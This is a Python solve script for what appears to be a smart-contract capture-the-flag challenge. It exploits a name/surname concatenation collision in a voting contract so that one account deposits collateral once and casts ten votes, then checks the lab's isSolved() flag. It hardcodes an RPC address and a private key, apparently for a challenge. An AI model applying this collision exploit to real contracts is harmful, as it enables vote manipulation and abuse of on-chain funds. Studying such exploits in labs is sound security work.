#!/usr/bin/env python3
import json
import sys
import time

import requests
from eth_abi import encode
from eth_account import Account
from eth_utils import keccak, to_checksum_address


RPC_URL = "http://154.57.164.81:31641/"
PRIVATE_KEY = "0xb12c7960aaf8c12187cec5e961bdb45d8cc7341ab8e1e8a148c122333a89a234"
TARGET = to_checksum_address("0x3C1Dda11697a41c9e92fE3134D39C9d52A9b32e3")
SETUP = to_checksum_address("0x596c4972ce4acb54e066D8AA0A005c623a250cbA")

COLLIDING_NAME = "SatoshiNakamot"
COLLIDING_SURNAME = "o"
PARTY = b"CIM"


def rpc(method, params):
    response = requests.post(
        RPC_URL,
        json={"jsonrpc": "2.0", "method": method, "params": params, "id": 1},
        timeout=10,
    )
    response.raise_for_status()
    payload = response.json()
    if "error" in payload:
        raise RuntimeError(payload["error"])
    return payload["result"]


def selector(signature: str) -> bytes:
    return keccak(text=signature)[:4]


def call(to: str, signature: str, arg_types=(), args=()):
    data = "0x" + (selector(signature) + encode(arg_types, args)).hex()
    return rpc("eth_call", [{"to": to, "data": data}, "latest"])


def send(account, nonce: int, to: str, signature: str, arg_types=(), args=(), value=0):
    data = "0x" + (selector(signature) + encode(arg_types, args)).hex()
    tx = {
        "chainId": int(rpc("eth_chainId", []), 16),
        "nonce": nonce,
        "to": to,
        "value": value,
        "data": data,
        "gas": 250000,
        "gasPrice": int(rpc("eth_gasPrice", []), 16),
    }
    signed = account.sign_transaction(tx)
    tx_hash = rpc("eth_sendRawTransaction", [signed.raw_transaction.hex()])
    print(f"sent {signature}: {tx_hash}")
    return tx_hash


def wait_for_receipt(tx_hash: str):
    for _ in range(30):
        receipt = rpc("eth_getTransactionReceipt", [tx_hash])
        if receipt is not None:
            status = int(receipt["status"], 16)
            if status != 1:
                raise RuntimeError(f"transaction failed: {tx_hash}")
            return receipt
        time.sleep(1)
    raise TimeoutError(f"no receipt for {tx_hash}")


def main():
    account = Account.from_key(PRIVATE_KEY)
    nonce = int(rpc("eth_getTransactionCount", [account.address, "pending"]), 16)

    deposit_hash = send(
        account,
        nonce,
        TARGET,
        "depositVoteCollateral(string,string)",
        ("string", "string"),
        (COLLIDING_NAME, COLLIDING_SURNAME),
        value=0,
    )
    wait_for_receipt(deposit_hash)
    nonce += 1

    for _ in range(10):
        vote_hash = send(
            account,
            nonce,
            TARGET,
            "vote(bytes3,string,string)",
            ("bytes3", "string", "string"),
            (PARTY, COLLIDING_NAME, COLLIDING_SURNAME),
        )
        wait_for_receipt(vote_hash)
        nonce += 1

    solved_raw = call(SETUP, "isSolved()")
    solved = int(solved_raw, 16) == 1
    print(json.dumps({"player": account.address, "isSolved": solved}))
    if not solved:
        sys.exit(1)


if __name__ == "__main__":
    main()
